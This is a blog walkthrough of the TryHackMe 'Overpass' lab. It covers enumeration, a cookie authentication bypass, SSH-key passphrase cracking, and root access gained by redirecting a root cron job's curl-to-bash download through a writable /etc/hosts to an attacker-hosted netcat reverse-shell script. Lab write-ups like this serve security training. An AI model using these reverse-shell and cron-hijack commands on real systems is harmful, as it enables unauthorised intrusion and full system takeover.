<!doctype html><html lang=en dir=auto><head><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>TryHackMe - Overpass | Umar_0x01 ‚Äì Pentester | Programmer | Your average sakurity guy ( Õ°~ Õú ñ Õ°¬∞)</title><meta name=keywords content="tryhackme,ssh,http,rustscan,gobuster,go,authbypass,privesc,cronjobs"><meta name=description content="Walkthrough of the boot2root machine Overpass on TryHackMe - https://tryhackme.com/room/overpass"><meta name=author content="Umar_0x01"><link rel=canonical href=https://umar0x01.sh/post/overpass-tryhackme/><meta name=google-site-verification content="GTM-TZKBTKP"><link crossorigin=anonymous href=/assets/css/stylesheet.min.59f065735d47f1e8b3aab68fc9c773b722b5adf3f4e6096c42e8a1f8db8b3822.css integrity="sha256-WfBlc11H8eizqraPycdztyK1rfP05glsQuih+NuLOCI=" rel="preload stylesheet" as=style><script defer crossorigin=anonymous src=/assets/js/highlight.min.7680afc38aa6b15ddf158a4f3780b7b1f7dde7e91d26f073e6229bb7a0793c92.js integrity="sha256-doCvw4qmsV3fFYpPN4C3sffd5+kdJvBz5iKbt6B5PJI=" onload=hljs.initHighlightingOnLoad()></script><link rel=icon href=https://umar0x01.sh/favicon/favicon.ico><link rel=icon type=image/png sizes=16x16 href=https://umar0x01.sh/favicon-16x16.png><link rel=icon type=image/png sizes=32x32 href=https://umar0x01.sh/favicon/favicon-32x32.png><link rel=apple-touch-icon href=https://umar0x01.sh/favicon/apple-touch-icon.png><link rel=mask-icon href=https://umar0x01.sh/safari-pinned-tab.svg><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><meta name=generator content="Hugo 0.82.0"><script type=application/javascript>var doNotTrack=!1;doNotTrack||(function(a,e,f,g,b,c,d){a.GoogleAnalyticsObject=b,a[b]=a[b]||function(){(a[b].q=a[b].q||[]).push(arguments)},a[b].l=1*new Date,c=e.createElement(f),d=e.getElementsByTagName(f)[0],c.async=1,c.src=g,d.parentNode.insertBefore(c,d)}(window,document,'script','https://www.google-analytics.com/analytics.js','ga'),ga('create','UA-177361132-1','auto'),ga('send','pageview'))</script><meta property="og:title" content="TryHackMe - Overpass"><meta property="og:description" content="Walkthrough of the boot2root machine Overpass on TryHackMe - https://tryhackme.com/room/overpass"><meta property="og:type" content="article"><meta property="og:url" content="https://umar0x01.sh/post/overpass-tryhackme/"><meta property="og:image" content="https://umar0x01.sh/images/overpass-thm/Untitled%202.png"><meta property="article:section" content="post"><meta property="article:published_time" content="2021-04-20T00:00:00+00:00"><meta property="article:modified_time" content="2021-04-20T00:00:00+00:00"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://umar0x01.sh/images/overpass-thm/Untitled%202.png"><meta name=twitter:title content="TryHackMe - Overpass"><meta name=twitter:description content="Walkthrough of the boot2root machine Overpass on TryHackMe - https://tryhackme.com/room/overpass"><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":2,"name":"Posts","item":"https://umar0x01.sh/post/"},{"@type":"ListItem","position":3,"name":"TryHackMe - Overpass","item":"https://umar0x01.sh/post/overpass-tryhackme/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"TryHackMe - Overpass","name":"TryHackMe - Overpass","description":"Walkthrough of the boot2root machine Overpass on TryHackMe - https://tryhackme.com/room/overpass","keywords":["tryhackme","ssh","http","rustscan","gobuster","go","authbypass","privesc","cronjobs"],"articleBody":"Enumeration  Link: https://tryhackme.com/room/overpass Creator: NinjaJc01 Host: 10.10.219.14\n Port Scanning Let‚Äôs kick off with a fast rustscan against the host.\n‚îå‚îÄ‚îÄ(rootüíÄb0x)-[~/THM/Overpass] ‚îî‚îÄ# rustscan -a 10.10.219.14 --ulimit 5000 -b 4500 -- -sC -sV The Modern Day Port Scanner. ________________________________________ : https://discord.gg/GFrQsGy : : https://github.com/RustScan/RustScan : -------------------------------------- Nmap? More like slowmap.üê¢ [~] The config file is expected to be at \"/root/.rustscan.toml\" [~] Automatically increasing ulimit value to 5000. Open 10.10.219.14:22 Open 10.10.219.14:80 ... PORT STATE SERVICE REASON VERSION 22/tcp open ssh syn-ack ttl 60 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 37:96:85:98:d1:00:9c:14:63:d9:b0:34:75:b1:f9:57 (RSA) | ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDLYC7Hj7oNzKiSsLVMdxw3VZFyoPeS/qKWID8x9IWY71z3FfPijiU7h9IPC+9C+kkHPiled/u3cVUVHHe7NS68fdN1+LipJxVRJ4o3IgiT8mZ7RPar6wpKVey6kubr8JAvZWLxIH6JNB16t66gjUt3AHVf2kmjn0y8cljJuWRCJRo9xpOjGtUtNJqSjJ8T0vGIxWTV/sWwAOZ0/TYQAqiBESX+GrLkXokkcBXlxj0NV+r5t+Oeu/QdKxh3x99T9VYnbgNPJdHX4YxCvaEwNQBwy46515eBYCE05TKA2rQP8VTZjrZAXh7aE0aICEnp6pow6KQUAZr/6vJtfsX+Amn3 | 256 53:75:fa:c0:65:da:dd:b1:e8:dd:40:b8:f6:82:39:24 (ECDSA) | ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBMyyGnzRvzTYZnN1N4EflyLfWvtDU0MN/L+O4GvqKqkwShe5DFEWeIMuzxjhE0AW+LH4uJUVdoC0985Gy3z9zQU= | 256 1c:4a:da:1f:36:54:6d:a6:c6:17:00:27:2e:67:75:9c (ED25519) |_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAINwiYH+1GSirMK5KY0d3m7Zfgsr/ff1CP6p14fPa7JOR 80/tcp open http syn-ack ttl 60 Golang net/http server (Go-IPFS json-rpc or InfluxDB API) |_http-favicon: Unknown favicon MD5: 0D4315E5A0B066CEFD5B216C8362564B | http-methods: |_ Supported Methods: GET HEAD POST OPTIONS |_http-title: Overpass Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel ... Port 80 - HTTP Noice, the server looks custom, let‚Äôs search if there‚Äôs any public exploit for this version/release.\nNone, sad. Let‚Äôs continue exploring the application. According to the box description, some students created a free password manager and we‚Äôre supposed to exploit it.\n‚Äî\nDownloading the (.go) file, we get the source code of the application:\npackage main import ( \"bufio\" \"encoding/json\" \"fmt\" \"io/ioutil\" \"os\" \"strconv\" \"strings\" \"github.com/mitchellh/go-homedir\" ) type passListEntry struct { Name string `json:\"name\"` Pass string `json:\"pass\"` } ... \nRunning gobuster we can see a hidden directory /admin\n‚îå‚îÄ‚îÄ(rootüíÄb0x)-[~/THM/Overpass] ‚îî‚îÄ# gobuster dir -u http://10.10.219.14 -w /usr/share/wordlists/dirb/common.txt -k -e -b 404 -t 100 =============================================================== Gobuster v3.1.0 by OJ Reeves (@TheColonial) \u0026 Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://10.10.219.14 [+] Method: GET [+] Threads: 100 [+] Wordlist: /usr/share/wordlists/dirb/common.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.1.0 [+] Expanded: true [+] Timeout: 10s =============================================================== 2021/04/20 13:00:30 Starting gobuster in directory enumeration mode =============================================================== http://10.10.219.14/aboutus (Status: 301) [Size: 0] [-- aboutus/] http://10.10.219.14/admin (Status: 301) [Size: 42] [-- /admin/] http://10.10.219.14/css (Status: 301) [Size: 0] [-- css/] http://10.10.219.14/downloads (Status: 301) [Size: 0] [-- downloads/] http://10.10.219.14/img (Status: 301) [Size: 0] [-- img/] http://10.10.219.14/index.html (Status: 301) [Size: 0] [-- ./] =============================================================== 2021/04/20 13:00:40 Finished =============================================================== \nRerunning gobuster with an extensive list of extensions with common.txt we get some .js files (those are also loaded when /admin is visited)\n‚îå‚îÄ‚îÄ(rootüíÄb0x)-[~/THM/Overpass] ‚îî‚îÄ# gobuster dir -u http://10.10.219.14 -w /usr/share/wordlists/dirb/common.txt -k -e -b 404,403 -t 100 -x php,jsp,rb,py,js,asp,aspx,zip,sql,tar,txt,key,doc,docx,html,jar,groovy,back,xml,ini,inc,config,json,yml,conf,cgi =============================================================== Gobuster v3.1.0 by OJ Reeves (@TheColonial) \u0026 Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://10.10.219.14 [+] Method: GET [+] Threads: 100 [+] Wordlist: /usr/share/wordlists/dirb/common.txt [+] Negative Status codes: 403,404 [+] User Agent: gobuster/3.1.0 [+] Extensions: aspx,jar,php,py,sql,tar,txt,html,ini,inc,rb,asp,zip,doc,docx,groovy,config,yml,conf,jsp,js,key,back,xml,json,cgi [+] Expanded: true [+] Timeout: 10s =============================================================== 2021/04/20 13:07:31 Starting gobuster in directory enumeration mode =============================================================== http://10.10.219.14/aboutus (Status: 301) [Size: 0] [-- aboutus/] http://10.10.219.14/admin (Status: 301) [Size: 42] [-- /admin/] http://10.10.219.14/404.html (Status: 200) [Size: 782] http://10.10.219.14/admin.html (Status: 200) [Size: 1525] http://10.10.219.14/cookie.js (Status: 200) [Size: 1502] http://10.10.219.14/css (Status: 301) [Size: 0] [-- css/] http://10.10.219.14/downloads (Status: 301) [Size: 0] [-- downloads/] http://10.10.219.14/img (Status: 301) [Size: 0] [-- img/] http://10.10.219.14/index.html (Status: 301) [Size: 0] [-- ./] http://10.10.219.14/index.html (Status: 301) [Size: 0] [-- ./] http://10.10.219.14/login.js (Status: 200) [Size: 1779] http://10.10.219.14/main.js (Status: 200) [Size: 28] =============================================================== 2021/04/20 13:11:38 Finished =============================================================== \nThe contents of the .js files include:\ncookie.js (beautified)\n/*! js-cookie v3.0.0-beta.4 | MIT */ ! function(e, t) { \"object\" == typeof exports \u0026\u0026 \"undefined\" != typeof module ? module.exports = t() : \"function\" == typeof define \u0026\u0026 define.amd ? define(t) : (e = e || self, function() { var r = e.Cookies, n = e.Cookies = t(); n.noConflict = function() { return e.Cookies = r, n } }()) }(this, function() { \"use strict\"; ... \nlogin.js\nasync function postData(url = '', data = {}) { // Default options are marked with *  const response = await fetch(url, { method: 'POST', // *GET, POST, PUT, DELETE, etc.  cache: 'no-cache', // *default, no-cache, reload, force-cache, only-if-cached  credentials: 'same-origin', // include, *same-origin, omit  headers: { 'Content-Type': 'application/x-www-form-urlencoded' }, redirect: 'follow', // manual, *follow, error  referrerPolicy: 'no-referrer', // no-referrer, *client  body: encodeFormData(data) // body data type must match \"Content-Type\" header  }); return response; // We don't always want JSON back } const encodeFormData = (data) = { return Object.keys(data) .map(key = encodeURIComponent(key) + '=' + encodeURIComponent(data[key])) .join('\u0026'); } function onLoad() { document.querySelector(\"#loginForm\").addEventListener(\"submit\", function (event) { //on pressing enter  event.preventDefault() login() }); } async function login() { const usernameBox = document.querySelector(\"#username\"); const passwordBox = document.querySelector(\"#password\"); const loginStatus = document.querySelector(\"#loginStatus\"); loginStatus.textContent = \"\" const creds = { username: usernameBox.value, password: passwordBox.value } const response = await postData(\"/api/login\", creds) const statusOrCookie = await response.text() if (statusOrCookie === \"Incorrect credentials\") { loginStatus.textContent = \"Incorrect Credentials\" passwordBox.value=\"\" } else { Cookies.set(\"SessionToken\",statusOrCookie) window.location = \"/admin\" } } \nmain.js\nconsole.log(\"Hello, World!\") \nFrom going through the JS files, we can see that login.js is utilized when we try to login through /admin endpoint in the application. It sends a POST request to /api/login for logging in the user.\nBased on the response, whatever it is, the cookies are set, we can call the object (Cookies.set(\"SessionToken\",statusOrCookie)) and try to set it to anything we like.\nSetting the cookie:\nVisiting page with it:\nExploitation I tried setting it to admin or administrator or just nothing, it still worked. Weird, oh well, we‚Äôve bypassed the authentication!\nThe page response looks like:\nAlright, we‚Äôve to crack the ssh key of user James. Let‚Äôs grab and do it.\n‚îå‚îÄ‚îÄ(rootüíÄb0x)-[~/THM/Overpass] ‚îî‚îÄ# cat  id_rsa.enc -----BEGIN RSA PRIVATE KEY----- Proc-Type: 4,ENCRYPTED DEK-Info: AES-128-CBC,9F85D92F34F42626F13A7493AB48F337 LNu5wQBBz7pKZ3cc4TWlxIUuD/opJi1DVpPa06pwiHHhe8Zjw3/v+xnmtS3O+qiN JHnLS8oUVR6Smosw4pqLGcP3AwKvrzDWtw2ycO7mNdNszwLp3uto7ENdTIbzvJal 73/eUN9kYF0ua9rZC6mwoI2iG6sdlNL4ZqsYY7rrvDxeCZJkgzQGzkB9wKgw1ljT WDyy8qncljugOIf8QrHoo30Gv+dAMfipTSR43FGBZ/Hha4jDykUXP0PvuFyTbVdv BMXmr3xuKkB6I6k/jLjqWcLrhPWS0qRJ718G/u8cqYX3oJmM0Oo3jgoXYXxewGSZ AL5bLQFhZJNGoZ+N5nHOll1OBl1tmsUIRwYK7wT/9kvUiL3rhkBURhVIbj2qiHxR 3KwmS4Dm4AOtoPTIAmVyaKmCWopf6le1+wzZ/UprNCAgeGTlZKX/joruW7ZJuAUf ABbRLLwFVPMgahrBp6vRfNECSxztbFmXPoVwvWRQ98Z+p8MiOoReb7Jfusy6GvZk VfW2gpmkAr8yDQynUukoWexPeDHWiSlg1kRJKrQP7GCupvW/r/Yc1RmNTfzT5eeR OkUOTMqmd3Lj07yELyavlBHrz5FJvzPM3rimRwEsl8GH111D4L5rAKVcusdFcg8P 9BQukWbzVZHbaQtAGVGy0FKJv1WhA+pjTLqwU+c15WF7ENb3Dm5qdUoSSlPzRjze eaPG5O4U9Fq0ZaYPkMlyJCzRVp43De4KKkyO5FQ+xSxce3FW0b63+8REgYirOGcZ 4TBApY+uz34JXe8jElhrKV9xw/7zG2LokKMnljG2YFIApr99nZFVZs1XOFCCkcM8 GFheoT4yFwrXhU1fjQjW/cR0kbhOv7RfV5x7L36x3ZuCfBdlWkt/h2M5nowjcbYn exxOuOdqdazTjrXOyRNyOtYF9WPLhLRHapBAkXzvNSOERB3TJca8ydbKsyasdCGy AIPX52bioBlDhg8DmPApR1C1zRYwT1LEFKt7KKAaogbw3G5raSzB54MQpX6WL+wk 6p7/wOX6WMo1MlkF95M3C7dxPFEspLHfpBxf2qys9MqBsd0rLkXoYR6gpbGbAW58 dPm51MekHD+WeP8oTYGI4PVCS/WF+U90Gty0UmgyI9qfxMVIu1BcmJhzh8gdtT0i n0Lz5pKY+rLxdUaAA9KVwFsdiXnXjHEE1UwnDqqrvgBuvX6Nux+hfgXi9Bsy68qT 8HiUKTEsukcv/IYHK1s+Uw/H5AWtJsFmWQs3bw+Y4iw+YLZomXA4E7yxPXyfWm4K 4FMg3ng0e4/7HRYJSaXLQOKeNwcf/LW5dipO7DmBjVLsC8eyJ8ujeutP/GcA5l6z ylqilOgj4+yiS813kNTjCJOwKRsXg2jKbnRa8b7dSRz7aDZVLpJnEy9bhn6a7WtS 49TxToi53ZB14+ougkL4svJyYYIRuQjrUmierXAdmbYF9wimhmLfelrMcofOHRW2 +hL1kHlTtJZU8Zj2Y2Y3hd6yRNJcIgCDrmLbn9C5M0d7g0h2BlFaJIZOYDS6J6Yk 2cWk/Mln7+OhAApAvDBKVM7/LGR9/sVPceEos6HTfBXbmsiV+eoFzUtujtymv8U7 -----END RSA PRIVATE KEY----- \nLet‚Äôs use ssh2john and convert it into a format recognizable by john.\n‚îå‚îÄ‚îÄ(rootüíÄb0x)-[~/THM/Overpass] ‚îî‚îÄ# ssh2john.py id_rsa.enc  id_rsa.john \nLet‚Äôs get cracking!\n‚îå‚îÄ‚îÄ(rootüíÄb0x)-[~/THM/Overpass] ‚îî‚îÄ# john id_rsa.john --wordlist=/usr/share/wordlists/rockyou.txt 1 ‚®Ø Using default input encoding: UTF-8 Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64]) Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes Cost 2 (iteration count) is 1 for all loaded hashes Will run 4 OpenMP threads Note: This format may emit false positives, so it will keep trying even after finding a possible candidate. Press 'q' or Ctrl-C to abort, almost any other key for status james13 (id_rsa.enc) Warning: Only 2 candidates left, minimum 4 needed for performance. 1g 0:00:00:05 DONE (2021-04-20 13:46) 0.1893g/s 2716Kp/s 2716Kc/s 2716KC/sa6_123..*7¬°Vamos! Session completed \nAwesome, we‚Äôve the ssh private key file's password. Let‚Äôs SSH! üòé\n‚îå‚îÄ‚îÄ(rootüíÄb0x)-[~/THM/Overpass] ‚îî‚îÄ# ssh -i id_rsa.enc james@10.10.219.14 The authenticity of host '10.10.219.14 (10.10.219.14)' can't be established. ECDSA key fingerprint is SHA256:4P0PNh/u8bKjshfc6DBYwWnjk1Txh5laY/WbVPrCUdY. Are you sure you want to continue connecting (yes/no/[fingerprint])? yes Warning: Permanently added '10.10.219.14' (ECDSA) to the list of known hosts. Enter passphrase for key 'id_rsa.enc': Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-108-generic x86_64) * Documentation: https://help.ubuntu.com  * Management: https://landscape.canonical.com  * Support: https://ubuntu.com/advantage  System information as of Tue Apr 20 08:47:58 UTC 2021 System load: 0.0 Processes: 87 Usage of /: 22.3% of 18.57GB Users logged in: 0 Memory usage: 15% IP address for eth0: 10.10.219.14 Swap usage: 0% 47 packages can be updated. 0 updates are security updates. Last login: Sat Jun 27 04:45:40 2020 from 192.168.170.1 james@overpass-prod:~$ id uid=1001(james) gid=1001(james) groups=1001(james) james@overpass-prod:~$ james@overpass-prod:~$ wc -c user.txt 38 user.txt Privileges Escalation We‚Äôve a todo.txt file in the home directory of james.\njames@overpass-prod:~$ cat todo.txt To Do:  Update Overpass' Encryption, Muirland has been complaining that it's not strong enough  Write down my password somewhere on a sticky note so that I don't forget it. Wait, we make a password manager. Why don't I just use that?  Test Overpass for macOS, it builds fine but I'm not sure it actually works  Ask Paradox how he got the automated build script working and where the builds go. They're not updating on the website \nLet‚Äôs check the .overpass file:\njames@overpass-prod:~$ cat .overpass \u0026\u0026 echo ,LQ?26QiQ$JDE6Q[QA2DDQiQD2J5C2H?=J:?8A:4EFC6QN. \nAwesome, let‚Äôs use decoder to decode the encoded string!\n‚îå‚îÄ‚îÄ(rootüíÄb0x)-[~/THM/Overpass] [3/55] ‚îî‚îÄ# pip3 install decoder Requirement already satisfied: decoder in /usr/local/lib/python3.9/dist-packages (0.5) Requirement already satisfied: termcolor in /usr/lib/python3/dist-packages (from decoder) (1.1.0) Requirement already satisfied: pycipher in /usr/local/lib/python3.9/dist-packages (from decoder) (0.5.2) ‚îå‚îÄ‚îÄ(rootüíÄb0x)-[~/THM/Overpass] ‚îî‚îÄ# decoder -s ',LQ?26QiQ$JDE6Q[QA2DDQiQD2J5C2H?=J:?8A:4EFC6QN.' ________ .___ \\______ \\  ____ ____ ____ __| _/___________ | | \\_/ __ \\_/ ___\\/ _ \\ / __ |/ __ \\_ __ \\  | ` \\  ___/\\  \\__(  ) /_/ \\  ___/| | \\/ /_______ /\\___ \\___ ____/\\____ |\\___ __| \\/ \\/ \\/ \\/ \\/ Automate the Manual :) --- [#] Provided string: ,LQ?26QiQ$JDE6Q[QA2DDQiQD2J5C2H?=J:?8A:4EFC6QN. --- ------------------------------------------------------- [%] Common Encodings [+] AtBash decoded: OJJRJQWVJJZWWJRJWQXSQZVUXJM ------------------------------------------------------- [%] Rot Encodings (13 - 47) [+] ROT13 decoded: ,YD?26DvD$WQR6D[DN2QQDvDQ2W5P2U?=W:?8N:4RSP6DA. [+] ROT47 decoded: [{\"name\":\"System\",\"pass\":\"saydrawnlyingpicture\"}] ------------------------------------------------------- [%] Ceaser Cipher (with shifts 0 - 9) [\u0026] Shift: 0 Decoded: ,LQ?26QiQ$JDE6Q[QA2DDQiQD2J5C2H?=J:?8A:4EFC6QN. ... ------------------------------------------------------- \nWe get the decoded string:\n[{\"name\":\"System\",\"pass\":\"saydrawnlyingpicture\"}] \nLet‚Äôs try this password as different users (from /etc/passwd):\njames@overpass-prod:~$ su - root Password: su: Authentication failure james@overpass-prod:~$ su - tryhackme Password: su: Authentication failure james@overpass-prod:~$ su - james Password: james@overpass-prod:~$ \nThe password only worked fine with james. Let‚Äôs see if we can run any binaries as user james.\njames@overpass-prod:~$ sudo -l [sudo] password for james: Sorry, user james may not run sudo on overpass-prod. \nSadloif, let‚Äôs run linpeas to do local enumeration.\njames@overpass-prod:~$ wget http://10.17.0.120/linpeas.sh \u0026\u0026 chmod +x linpeas.sh --2021-04-20 08:53:23-- http://10.17.0.120/linpeas.sh Connecting to 10.17.0.120:80... connected. HTTP request sent, awaiting response... 200 OK Length: 328992 (321K) [text/x-sh] Saving to: ‚Äòlinpeas.sh‚Äô linpeas.sh 100%[=====================================================================================================================] 321.28K 267KB/s in 1.2s 2021-04-20 08:53:24 (267 KB/s) - ‚Äòlinpeas.sh‚Äô saved [328992/328992] \nGoing through the results of linpeas, we can see that there‚Äôs a cronjob running as root user every minute!\n# /etc/crontab: system-wide crontab # Unlike any other crontab you don't have to run the `crontab' # command to install the new version when you edit this file # and files in /etc/cron.d. These files also have username fields, # that none of the other crontabs do. SHELL=/bin/sh PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin # m h dom mon dow user command 17 * * * * root cd / \u0026\u0026 run-parts --report /etc/cron.hourly 25 6 * * * root test -x /usr/sbin/anacron || ( cd / \u0026\u0026 run-parts --report /etc/cron.daily ) 47 6 * * 7 root test -x /usr/sbin/anacron || ( cd / \u0026\u0026 run-parts --report /etc/cron.weekly ) 52 6 1 * * root test -x /usr/sbin/anacron || ( cd / \u0026\u0026 run-parts --report /etc/cron.monthly ) # Update builds from latest code * * * * * root curl overpass.thm/downloads/src/buildscript.sh | bash \nChecking /etc/hosts overpass.thm points to our localhost server.\njames@overpass-prod:~$ cat /etc/hosts 127.0.0.1 localhost 127.0.1.1 overpass-prod 127.0.0.1 overpass.thm \nGoing further through linpeas results, we can see that /etc/hosts is writeable by us.\n[+] Interesting writable files owned by me or writable by everyone (not in Home) (max 500) [i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#writable-files /dev/mqueue /dev/shm /etc/hosts /home/james /run/lock /run/screen /run/screen/S-james /run/user/1001 /run/user/1001/gnupg /run/user/1001/systemd /tmp /tmp/.ICE-unix /tmp/.Test-unix /tmp/.X11-unix /tmp/.XIM-unix /tmp/.font-unix #)You_can_write_even_more_files_inside_last_directory /var/crash /var/tmp -- james@overpass-prod:~$ ls -la /etc/hosts -rw-rw-rw- 1 root root 250 Jun 27 2020 /etc/hosts \nRest is easy, let‚Äôs change this host to our IP, and make it fetch the .sh file. You can either use python or apache server, since my apache server is already running on port 80, I‚Äôll be using that.\nThe file /etc/hosts then looks like:\njames@overpass-prod:~$ cat /etc/hosts 127.0.0.1 localhost 127.0.1.1 overpass-prod 10.17.0.120 overpass.thm \nLet‚Äôs now create directories on our server for it to fetch:\n‚îå‚îÄ‚îÄ(rootüíÄb0x)-[/var/www/html] ‚îî‚îÄ# mkdir -p downloads/src/ ‚îå‚îÄ‚îÄ(rootüíÄb0x)-[/var/www/html] ‚îî‚îÄ# cd downloads/src ‚îå‚îÄ‚îÄ(rootüíÄb0x)-[/var/www/html/downloads/src] ‚îî‚îÄ# cat  buildscript.sh rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2\u00261|nc 10.17.0.120 4444 /tmp/f \nLet‚Äôs start our listener now! üï∫\n‚îå‚îÄ‚îÄ(rootüíÄb0x)-[/var/www/html/downloads/src] ‚îî‚îÄ# nc -nlvp 4444 listening on [any] 4444 ... connect to [10.17.0.120] from (UNKNOWN) [10.10.219.14] 60760 bash: cannot set terminal process group (20179): Inappropriate ioctl for device bash: no job control in this shell root@overpass-prod:~# id id uid=0(root) gid=0(root) groups=0(root) root@overpass-prod:~# ls -al ls -al total 56 drwx------ 8 root root 4096 Jun 27 2020 . drwxr-xr-x 23 root root 4096 Jun 27 2020 .. lrwxrwxrwx 1 root root 9 Jun 27 2020 .bash_history - /dev/null -rw------- 1 root root 3106 Apr 9 2018 .bashrc drwx------ 3 root root 4096 Jun 27 2020 .cache drwx------ 3 root root 4096 Jun 27 2020 .local -rw------- 1 root root 184 Jun 27 2020 .profile drwx------ 2 root root 4096 Jun 27 2020 .ssh -rw-r--r-- 1 root root 11662 Apr 20 09:03 buildStatus drwx------ 2 root root 4096 Jun 27 2020 builds drwxr-xr-x 4 root root 4096 Jun 27 2020 go -rw------- 1 root root 38 Jun 27 2020 root.txt drwx------ 2 root root 4096 Jun 27 2020 src root@overpass-prod:~# wc -c root.txt wc -c root.txt 38 root.txt \nCool, we‚Äôre root!\nBonus Challenge: We now have to find the coupon hid by the author for THM subscription (it has been taken over already as told in the challenge) but let‚Äôs search it anyways.\nroot@overpass-prod:~# find / -name \".overpass\" 2/dev/null /home/tryhackme/.overpass /home/james/.overpass \nLet‚Äôs check /home/tryhackme/.overpass:\nroot@overpass-prod:~# cat /home/tryhackme/.overpass \u0026\u0026 echo ,LQ?26QiQ%CJw246 $F3D4C:AE:@? r@56Q[QA2DDQiQ8%sJ=QN. \nDecoded:\n‚îå‚îÄ‚îÄ(rootüíÄb0x)-[~/THM/Overpass] ‚îî‚îÄ# decoder -s ',LQ?26QiQ%CJw24%sJ=QN.' ________ .___ \\______ \\  ____ ____ ____ __| _/___________ | | \\_/ __ \\_/ ___\\/ _ \\ / __ |/ __ \\_ __ \\  | ` \\  ___/\\  \\__(  ) /_/ \\  ___/| | \\/ /_______ /\\___ \\___ ____/\\____ |\\___ __| \\/ \\/ \\/ \\/ \\/ Automate the Manual :) --- [#] Provided string: ,LQ?26QiQ%CJw24%sJ=QN. --- ------------------------------------------------------- [%] Common Encodings [+] AtBash decoded: OJJRJXQDUWXZVIJJZWWJRJHQJM [+] Morse decoded: ------------------------------------------------------- [%] Rot Encodings (13 - 47) [+] ROT13 decoded: ,YD?26DvD%PWj246 $S3Q4P:NR:@? e@56D[DN2QQDvD8%fW=DA. [+] ROT47 decoded: [{\"name\":\"TryHackMe Subscription Code\",\"pass\":\"gmTDyl\"}] ------------------------------------------------------- [%] Ceaser Cipher (with shifts 0 - 9) [\u0026] Shift: 0 Decoded: ,LQ?26QiQ%CJw246 $F3D4C:AE:@? r@56Q[QA2DDQiQ8%sJ=QN. ... ------------------------------------------------------- \nCode: gmTDyl\nThanks for reading this walkthrough, hopefully you liked it! üòâ\n Todos ‚Äî Things learnt  Always check the source code of .js files Don‚Äôt keep dirsearching and enumerate the found paths already Always check for sensitive files permissions  ","wordCount":"2272","inLanguage":"en","image":"https://umar0x01.sh/images/overpass-thm/Untitled%202.png","datePublished":"2021-04-20T00:00:00Z","dateModified":"2021-04-20T00:00:00Z","author":{"@type":"Person","name":"Umar_0x01"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://umar0x01.sh/post/overpass-tryhackme/"},"publisher":{"@type":"Organization","name":"Umar_0x01 ‚Äì Pentester | Programmer | Your average sakurity guy ( Õ°~ Õú ñ Õ°¬∞)","logo":{"@type":"ImageObject","url":"https://umar0x01.sh/favicon/favicon.ico"}}}</script></head><body class=dark id=top><script>localStorage.getItem("pref-theme")==="light"&&document.body.classList.remove('dark')</script><noscript><style type=text/css>#theme-toggle,.top-link{display:none}</style></noscript><header class=header><nav class=nav><div class=logo><a class=label_text_header href=https://umar0x01.sh accesskey=h title="> umar_0x01 | blog (Alt + H)"><span id=cusor_blink>></span> umar_0x01 | blog</a>
<span class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)"><svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg><svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button></span></div><ul id=menu onscroll=menu_on_scroll()><li><a href=https://umar0x01.sh/archives/ title=Posts><span>Posts</span></a></li><li><a href=https://umar0x01.sh/anime/ title=Anime><span>Anime</span></a></li><li><a href=https://umar0x01.sh/categories/ title=Categories><span>Categories</span></a></li><li><a href=https://umar0x01.sh/search/ title="Search (Alt + /)" accesskey=/><span>Search</span></a></li><li><a href=https://umar0x01.sh/tags/ title=Tags><span>Tags</span></a></li></ul></nav><script type=text/javascript>var cursor=!0,speed=500;setInterval(()=>{cursor?(document.getElementById('cusor_blink').style.opacity=0,cursor=!1):(document.getElementById('cusor_blink').style.opacity=1,cursor=!0)},speed)</script></header><main class=main><article class=post-single><header class=post-header><div class=breadcrumbs><a href=https://umar0x01.sh>Home</a>&nbsp;¬ª&nbsp;<a href=https://umar0x01.sh/post/>Posts</a></div><h1 class=post-title>TryHackMe - Overpass</h1><div class=post-description>Walkthrough of the boot2root machine Overpass on TryHackMe - https://tryhackme.com/room/overpass</div><div class=post-meta>April 20, 2021&nbsp;¬∑&nbsp;11 min&nbsp;¬∑&nbsp;Umar_0x01</div></header><div class=post-content><h2 id=enumeration>Enumeration<a hidden class=anchor aria-hidden=true href=#enumeration>#</a></h2><hr><p>Link: <a 